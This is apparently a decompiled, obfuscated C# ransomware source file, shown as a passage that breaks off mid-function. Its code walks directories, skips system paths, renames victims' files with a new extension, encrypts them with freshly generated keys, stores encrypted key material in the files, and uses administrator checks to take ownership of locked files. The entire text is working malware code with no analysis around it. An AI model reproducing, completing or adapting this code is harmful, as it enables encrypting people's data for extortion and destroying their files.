using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using QFSLrCXCNYPIKJ;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

internal sealed class tEjVFvrPgtsm
{
	public sealed class WfwjzXqMlnLKXBb
	{
		private static StringCollection UnvRrQGflzv;

		private static List<string> qGJAheLzWQw;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107349129));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107349124)) && !text.ToLower().Contains(getString_0(107349615)) && !text.ToLower().Contains(getString_0(107400333)) && !text.ToLower().Contains(getString_0(107400800)) && !text.ToLower().Contains(getString_0(107349570)) && !text.ToLower().Contains(getString_0(107400684)) && !text.ToLower().Contains(getString_0(107400625)) && !text.ToLower().Contains(getString_0(107400576)) && !text.ToLower().Contains(getString_0(107400591)) && !text.ToLower().Contains(getString_0(107400030)) && !text.ToLower().Contains(getString_0(107399996)) && !text.ToLower().Contains(getString_0(107400011)) && !text.ToLower().Contains(getString_0(107399962)) && !text.ToLower().Contains(getString_0(107399981)) && !text.ToLower().Contains(getString_0(107399928)) && !text.ToLower().Contains(getString_0(107399947)) && !text.ToLower().Contains(getString_0(107399902)) && !text.ToLower().Contains(getString_0(107399917)) && !text.ToLower().Contains(getString_0(107399868)) && !text.Contains(OEjiexKEqeO(getString_0(107399883))) && !text.Contains(getString_0(107399858)) && !text.Contains(getString_0(107399845)) && !text.EndsWith(getString_0(107395162)) && !text.EndsWith(getString_0(107399820)) && !text.EndsWith(getString_0(107399815)) && !text.EndsWith(getString_0(107400290)) && !text.EndsWith(getString_0(107400285)) && !text.ToLower().Contains(getString_0(107400280)) && !text.ToLower().Contains(ZLERFztvScvXGTf))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(FoLsSeMcEVuV) * 1024.0 * 1024.0 && QotWPeyjvzjx == getString_0(107396814))
							{
								qGJAheLzWQw.Add(text);
							}
							else if (File.Exists(text) && QotWPeyjvzjx == getString_0(107396348))
							{
								qGJAheLzWQw.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return qGJAheLzWQw;
		}

		static WfwjzXqMlnLKXBb()
		{
			Strings.CreateGetStringDelegate(typeof(WfwjzXqMlnLKXBb));
			UnvRrQGflzv = new StringCollection();
			qGJAheLzWQw = new List<string>();
		}
	}

	private sealed class qfTxGPzVjXWk
	{
		public string vjohKiJyzSRaUeWhX;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == vjohKiJyzSRaUeWhX;
		}
	}

	private sealed class EEavbmEMQoKeJ
	{
		private sealed class UOEEhIEilusU
		{
			public EEavbmEMQoKeJ CmugrfMrRPzmz;

			public string QHcameMEDyksqkWY;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					uspKwdLgume(WindowsIdentity.GetCurrent().Name, QHcameMEDyksqkWY);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				KPExWynENnAdrRu(QHcameMEDyksqkWY, CmugrfMrRPzmz.CqITlEjkWXnTK, CmugrfMrRPzmz.tNRwfpjZiNCOM, CmugrfMrRPzmz.aFwtZhkyhonxJx, CmugrfMrRPzmz.XXWrItZGjdyeN);
			}
		}

		public string[] CqITlEjkWXnTK;

		public string[] aFwtZhkyhonxJx;

		public string XXWrItZGjdyeN;

		public string tNRwfpjZiNCOM;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			UOEEhIEilusU CS_0024_003C_003E8__locals0 = new UOEEhIEilusU();
			CS_0024_003C_003E8__locals0.CmugrfMrRPzmz = this;
			CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY = string_0;
			if (bTMUTlJGkGOO && !rLhkxjtAGaYQ().Contains(getString_0(107398006)) && !rLhkxjtAGaYQ().Contains(getString_0(107397902)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						uspKwdLgume(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (gsXyoeFOorGZ == getString_0(107396820))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					KPExWynENnAdrRu(CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY, CS_0024_003C_003E8__locals0.CmugrfMrRPzmz.CqITlEjkWXnTK, CS_0024_003C_003E8__locals0.CmugrfMrRPzmz.tNRwfpjZiNCOM, CS_0024_003C_003E8__locals0.CmugrfMrRPzmz.aFwtZhkyhonxJx, CS_0024_003C_003E8__locals0.CmugrfMrRPzmz.XXWrItZGjdyeN);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				KPExWynENnAdrRu(CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY, CqITlEjkWXnTK, tNRwfpjZiNCOM, aFwtZhkyhonxJx, XXWrItZGjdyeN);
			}
		}

		static EEavbmEMQoKeJ()
		{
			Strings.CreateGetStringDelegate(typeof(EEavbmEMQoKeJ));
		}
	}

	private sealed class evlxOkrixnZkwgY
	{
		private sealed class zPoLbQDPrHj
		{
			public evlxOkrixnZkwgY xIhpFsMthiO;

			public string tDwFwsGDrP;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				try
				{
					if (SidumIOOlYmWUm)
					{
						Console.WriteLine(getString_0(107348636) + tDwFwsGDrP + getString_0(107349557) + new FileInfo(tDwFwsGDrP).Length + getString_0(107349536));
						Console.WriteLine(getString_0(107349123), JEkdiihxCoWf.Count, DPjjDEUnrYJ, ZzaknwGiCeEd);
						Console.WriteLine(getString_0(107349034), VxQUKIskXHMm.Elapsed);
						Console.WriteLine(getString_0(107349527));
					}
				}
				catch
				{
				}
			}

			static zPoLbQDPrHj()
			{
				Strings.CreateGetStringDelegate(typeof(zPoLbQDPrHj));
			}
		}

		private sealed class MlhxfWYHvBPnrE
		{
			public zPoLbQDPrHj nTnXDlFGnPsXG;

			public evlxOkrixnZkwgY xIhpFsMthiO;

			public string XmJykDMKNMhzu;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2e()
			{
				foreach (string item in tnUDcbYyevrzGRJA)
				{
					if (XmJykDMKNMhzu.ToLower().EndsWith(item + xIhpFsMthiO.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == getString_0(107396835))
					{
						if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(XmJykDMKNMhzu).Length)
						{
							try
							{
								AVKODeXgMr.tvyItwYqcU(getString_0(107401054), getString_0(107401049), getString_0(107401004), XmJykDMKNMhzu);
							}
							catch
							{
							}
						}
					}
					else if (XmJykDMKNMhzu.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396369))
					{
						try
						{
							AVKODeXgMr.tvyItwYqcU(getString_0(107401054), getString_0(107401049), getString_0(107401004), XmJykDMKNMhzu);
						}
						catch
						{
						}
					}
				}
			}

			static MlhxfWYHvBPnrE()
			{
				Strings.CreateGetStringDelegate(typeof(MlhxfWYHvBPnrE));
			}
		}

		private sealed class tdXNNsWJFtDVWeIAq
		{
			public evlxOkrixnZkwgY xIhpFsMthiO;

			public string tDwFwsGDrP;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__30()
			{
				try
				{
					if (SidumIOOlYmWUm)
					{
						Console.WriteLine(getString_0(107348643) + tDwFwsGDrP + getString_0(107349564) + new FileInfo(tDwFwsGDrP).Length + getString_0(107349543));
						Console.WriteLine(getString_0(107349130), JEkdiihxCoWf.Count, DPjjDEUnrYJ, ZzaknwGiCeEd);
						Console.WriteLine(getString_0(107349041), VxQUKIskXHMm.Elapsed);
						Console.WriteLine(getString_0(107349534));
					}
				}
				catch
				{
				}
			}

			public void _003CWorkerCrypter2_003Eb__31()
			{
				foreach (string item in tnUDcbYyevrzGRJA)
				{
					if (tDwFwsGDrP.ToLower().EndsWith(item + xIhpFsMthiO.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == getString_0(107396838))
					{
						if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(tDwFwsGDrP).Length)
						{
							try
							{
								AVKODeXgMr.tvyItwYqcU(getString_0(107401057), getString_0(107401052), getString_0(107401007), tDwFwsGDrP);
							}
							catch
							{
							}
						}
					}
					else if (tDwFwsGDrP.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396372))
					{
						try
						{
							AVKODeXgMr.tvyItwYqcU(getString_0(107401057), getString_0(107401052), getString_0(107401007), tDwFwsGDrP);
						}
						catch
						{
						}
					}
				}
			}

			static tdXNNsWJFtDVWeIAq()
			{
				Strings.CreateGetStringDelegate(typeof(tdXNNsWJFtDVWeIAq));
			}
		}

		public List<string> pyrQmieHmmx;

		public List<string> aGPipPUJxaM;

		public string NWwyysQYwQDK;

		public string[] OyagJirLxGEcF;

		public string OxsDDfqLEi;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			using List<string>.Enumerator enumerator = aGPipPUJxaM.GetEnumerator();
			MlhxfWYHvBPnrE CS_0024_003C_003E8__locals0;
			while (enumerator.MoveNext())
			{
				zPoLbQDPrHj CS_0024_003C_003E8__locals1 = new zPoLbQDPrHj();
				CS_0024_003C_003E8__locals1.xIhpFsMthiO = this;
				CS_0024_003C_003E8__locals1.tDwFwsGDrP = enumerator.Current;
				if (OyagJirLxGEcF.Length != 0)
				{
					string[] oyagJirLxGEcF = OyagJirLxGEcF;
					int num = 0;
					while (num < oyagJirLxGEcF.Length)
					{
						string value = oyagJirLxGEcF[num];
						if (!CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0bda;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(NWwyysQYwQDK))
					{
						goto IL_0bda;
					}
				}
				catch (Exception)
				{
					goto IL_0bda;
				}
				if (!CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(string_0) || JEkdiihxCoWf.Contains(CS_0024_003C_003E8__locals1.tDwFwsGDrP))
				{
					continue;
				}
				if (NgbDiBVJKDTW == getString_0(107396828))
				{
					try
					{
						if (yumxjKYoRmmkpGk.qPsEsqVRgYW(CS_0024_003C_003E8__locals1.tDwFwsGDrP))
						{
							yumxjKYoRmmkpGk.QhHAFUyRZP(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
						}
					}
					catch
					{
					}
				}
				JEkdiihxCoWf.Add(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (SidumIOOlYmWUm)
						{
							Console.WriteLine(zPoLbQDPrHj.getString_0(107348636) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + zPoLbQDPrHj.getString_0(107349557) + new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length + zPoLbQDPrHj.getString_0(107349536));
							Console.WriteLine(zPoLbQDPrHj.getString_0(107349123), JEkdiihxCoWf.Count, DPjjDEUnrYJ, ZzaknwGiCeEd);
							Console.WriteLine(zPoLbQDPrHj.getString_0(107349034), VxQUKIskXHMm.Elapsed);
							Console.WriteLine(zPoLbQDPrHj.getString_0(107349527));
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.tDwFwsGDrP)))
				{
					IDUZlSGaIfn.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.tDwFwsGDrP));
				}
				rkkEfvYkADSUN(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
				try
				{
					new jXmmwQRRLpp().EBPsQUzBBDij(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals1.tDwFwsGDrP, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (SidumIOOlYmWUm)
							{
								Console.WriteLine(getString_0(107349599) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107349554) + new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length + getString_0(107349533));
								Console.WriteLine(getString_0(107349524));
							}
						}
						catch
						{
						}
						nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107349387)), getString_0(107400242) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107400242) + OEjiexKEqeO(getString_0(107349394)) + getString_0(107400242) + Environment.UserName + getString_0(107400242) + OEjiexKEqeO(getString_0(107348833)));
					}
				}
				catch (Exception ex2)
				{
					if (SWaMdrdKGgzowGl)
					{
						try
						{
							File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398628) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107348808) + ex2.Message + getString_0(107396514));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (SWaMdrdKGgzowGl)
						{
							try
							{
								File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398628) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107348759) + ex4.Message + getString_0(107396514));
							}
							catch (Exception)
							{
							}
						}
						ZzaknwGiCeEd++;
						goto end_IL_037b;
					}
					if (krdgQbbXWsBnkAs == getString_0(107396828) && new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length > Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024 && !pyrQmieHmmx.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new MlhxfWYHvBPnrE();
						CS_0024_003C_003E8__locals0.nTnXDlFGnPsXG = CS_0024_003C_003E8__locals1;
						CS_0024_003C_003E8__locals0.xIhpFsMthiO = this;
						try
						{
							if (NWwyysQYwQDK != getString_0(107397879))
							{
								if (OtvlrYHFRq)
								{
									NWwyysQYwQDK = YgTmUCLcTtww + NWwyysQYwQDK;
								}
								File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK);
							}
						}
						catch (Exception ex6)
						{
							if (SWaMdrdKGgzowGl)
							{
								try
								{
									File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398628) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107348698) + ex6.Message + getString_0(107396514));
								}
								catch (Exception)
								{
								}
							}
							ZzaknwGiCeEd++;
							goto end_IL_037b;
						}
						CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = getString_0(107400934);
						if (NWwyysQYwQDK != getString_0(107397879))
						{
							CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK;
						}
						else
						{
							CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = CS_0024_003C_003E8__locals1.tDwFwsGDrP;
						}
						if (pRibgXhmfietto == getString_0(107396828))
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in tnUDcbYyevrzGRJA)
								{
									if (CS_0024_003C_003E8__locals0.XmJykDMKNMhzu.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.xIhpFsMthiO.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == MlhxfWYHvBPnrE.getString_0(107396835))
									{
										if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu).Length)
										{
											try
											{
												AVKODeXgMr.tvyItwYqcU(MlhxfWYHvBPnrE.getString_0(107401054), MlhxfWYHvBPnrE.getString_0(107401049), MlhxfWYHvBPnrE.getString_0(107401004), CS_0024_003C_003E8__locals0.XmJykDMKNMhzu);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.XmJykDMKNMhzu.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == MlhxfWYHvBPnrE.getString_0(107396369))
									{
										try
										{
											AVKODeXgMr.tvyItwYqcU(MlhxfWYHvBPnrE.getString_0(107401054), MlhxfWYHvBPnrE.getString_0(107401049), MlhxfWYHvBPnrE.getString_0(107401004), CS_0024_003C_003E8__locals0.XmJykDMKNMhzu);
										}
										catch
										{
										}
									}
								}
							});
							thread2.Priority = ThreadPriority.Normal;
							thread2.IsBackground = false;
							thread2.Start();
						}
						string text = VfObglZXpshJy.puTvlrNJxrKCPF(32);
						string text2 = getString_0(107400934);
						text2 = (UpNccIaFzBadyA ? VfObglZXpshJy.ZAaQeGPmgdp() : getString_0(107400934));
						string s = mhNHGBImqIMFfl.QNVOHiUyNEwNRw(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (dhEsUcbXeBeyR == getString_0(107396362))
						{
							byte[] array = null;
							byte[] byte_ = pNCPZOFhXOgiy.PLYaACyiXPLfDqos(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
							if (pNCPZOFhXOgiy.nKguzTWYAHcXu(QaGqIxJvWtgUo: (!OTLCmOpFsMP) ? (UpNccIaFzBadyA ? pNCPZOFhXOgiy.xjeqXDBiuVwBVy(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : pNCPZOFhXOgiy.xjeqXDBiuVwBVy(byte_, Convert.FromBase64String(OxsDDfqLEi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UpNccIaFzBadyA ? FRFdLnqaFph.BWvSzInVLSLIKib(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : FRFdLnqaFph.BWvSzInVLSLIKib(byte_, Convert.FromBase64String(OxsDDfqLEi), Convert.FromBase64String(lXgIUpLgAi))), NrVjtCgSTarJ: CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, VLHQPqpLBGisux: bytes))
							{
								goto IL_0bda;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
							}
							catch (Exception)
							{
							}
						}
						else if (!UpNccIaFzBadyA)
						{
							if (LjjjikaIyK.pPZVhaEwmPX(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, bQealBkUmzhp, OxsDDfqLEi, null, Convert.FromBase64String(lXgIUpLgAi)))
							{
								goto IL_0bda;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (LjjjikaIyK.pPZVhaEwmPX(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, bQealBkUmzhp, text, bytes, Convert.FromBase64String(text2)))
							{
								goto IL_0bda;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (OtvlrYHFRq)
					{
						NWwyysQYwQDK = YgTmUCLcTtww + NWwyysQYwQDK;
					}
					string text3 = VfObglZXpshJy.puTvlrNJxrKCPF(32);
					string text4 = getString_0(107400934);
					text4 = (UpNccIaFzBadyA ? VfObglZXpshJy.ZAaQeGPmgdp() : getString_0(107400934));
					string s2 = mhNHGBImqIMFfl.QNVOHiUyNEwNRw(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (NWwyysQYwQDK != getString_0(107397879))
					{
						if (!NbfRNVirWcO)
						{
							if (!UpNccIaFzBadyA)
							{
								xpGkySSqwDX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, nQCMwcWKyQk);
							}
							else
							{
								xpGkySSqwDX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!UpNccIaFzBadyA)
								{
									KmXLFgoTfYmkE(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
								}
								else
								{
									KmXLFgoTfYmkE(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex11)
							{
								if (SWaMdrdKGgzowGl)
								{
									try
									{
										File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398628) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107397833) + ex11.Message + getString_0(107396514));
									}
									catch (Exception)
									{
									}
								}
								ZzaknwGiCeEd++;
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
								}
								catch (Exception)
								{
								}
								goto end_IL_037b;
							}
						}
					}
					else if (!NbfRNVirWcO)
					{
						if (!UpNccIaFzBadyA)
						{
							xpGkySSqwDX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107397874), nQCMwcWKyQk);
						}
						else
						{
							xpGkySSqwDX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107397874), Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!UpNccIaFzBadyA)
							{
								KmXLFgoTfYmkE(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
							}
							else
							{
								KmXLFgoTfYmkE(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex14)
						{
							if (SWaMdrdKGgzowGl)
							{
								try
								{
									File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398628) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107397833) + ex14.Message + getString_0(107396514));
								}
								catch (Exception)
								{
								}
							}
							ZzaknwGiCeEd++;
							goto end_IL_037b;
						}
					}
					if (UpNccIaFzBadyA)
					{
						if (NWwyysQYwQDK != getString_0(107397879))
						{
							KFuNWiOQTHKqWciPe(CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, bytes2);
						}
						else
						{
							KFuNWiOQTHKqWciPe(CS_0024_003C_003E8__locals1.tDwFwsGDrP, bytes2);
						}
					}
					goto IL_0bda;
					end_IL_037b:;
				}
				catch (Exception)
				{
					goto IL_0bda;
				}
				continue;
				IL_0bda:
				aGPipPUJxaM.Remove(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2f(string string_0)
		{
			tdXNNsWJFtDVWeIAq CS_0024_003C_003E8__locals0 = new tdXNNsWJFtDVWeIAq();
			CS_0024_003C_003E8__locals0.xIhpFsMthiO = this;
			CS_0024_003C_003E8__locals0.tDwFwsGDrP = string_0;
			if (OyagJirLxGEcF.Length != 0)
			{
				string[] oyagJirLxGEcF = OyagJirLxGEcF;
				int num = 0;
				while (num < oyagJirLxGEcF.Length)
				{
					string value = oyagJirLxGEcF[num];
					if (!CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0b55;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(NWwyysQYwQDK))
				{
					goto IL_0b55;
				}
			}
			catch (Exception)
			{
				goto IL_0b55;
			}
			if (!JEkdiihxCoWf.Contains(CS_0024_003C_003E8__locals0.tDwFwsGDrP))
			{
				if (NgbDiBVJKDTW == getString_0(107396828))
				{
					try
					{
						if (yumxjKYoRmmkpGk.qPsEsqVRgYW(CS_0024_003C_003E8__locals0.tDwFwsGDrP))
						{
							yumxjKYoRmmkpGk.QhHAFUyRZP(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
						}
					}
					catch
					{
					}
				}
				JEkdiihxCoWf.Add(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (SidumIOOlYmWUm)
						{
							Console.WriteLine(tdXNNsWJFtDVWeIAq.getString_0(107348643) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + tdXNNsWJFtDVWeIAq.getString_0(107349564) + new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length + tdXNNsWJFtDVWeIAq.getString_0(107349543));
							Console.WriteLine(tdXNNsWJFtDVWeIAq.getString_0(107349130), JEkdiihxCoWf.Count, DPjjDEUnrYJ, ZzaknwGiCeEd);
							Console.WriteLine(tdXNNsWJFtDVWeIAq.getString_0(107349041), VxQUKIskXHMm.Elapsed);
							Console.WriteLine(tdXNNsWJFtDVWeIAq.getString_0(107349534));
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.tDwFwsGDrP)))
				{
					IDUZlSGaIfn.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.tDwFwsGDrP));
				}
				rkkEfvYkADSUN(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
				try
				{
					new jXmmwQRRLpp().EBPsQUzBBDij(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.tDwFwsGDrP, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (SidumIOOlYmWUm)
							{
								Console.WriteLine(getString_0(107349599) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107349554) + new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length + getString_0(107349533));
								Console.WriteLine(getString_0(107349524));
							}
						}
						catch
						{
						}
						nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107349387)), getString_0(107400242) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107400242) + OEjiexKEqeO(getString_0(107349394)) + getString_0(107400242) + Environment.UserName + getString_0(107400242) + OEjiexKEqeO(getString_0(107348833)));
					}
				}
				catch (Exception ex2)
				{
					if (SWaMdrdKGgzowGl)
					{
						try
						{
							File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398628) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107348808) + ex2.Message + getString_0(107396514));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length != 0L)
						{
							goto end_IL_0348;
						}
						goto end_IL_0348_2;
						end_IL_0348:;
					}
					catch (Exception ex4)
					{
						if (SWaMdrdKGgzowGl)
						{
							try
							{
								File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398628) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107348759) + ex4.Message + getString_0(107396514));
							}
							catch (Exception)
							{
							}
						}
						ZzaknwGiCeEd++;
						goto end_IL_0348_2;
					}
					if (krdgQbbXWsBnkAs == getString_0(107396828) && new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length > Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024)
					{
						try
						{
							if (NWwyysQYwQDK != getString_0(107397879))
							{
								if (OtvlrYHFRq)
								{
									NWwyysQYwQDK = YgTmUCLcTtww + NWwyysQYwQDK;
								}
								File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK);
							}
						}
						catch (Exception ex6)
						{
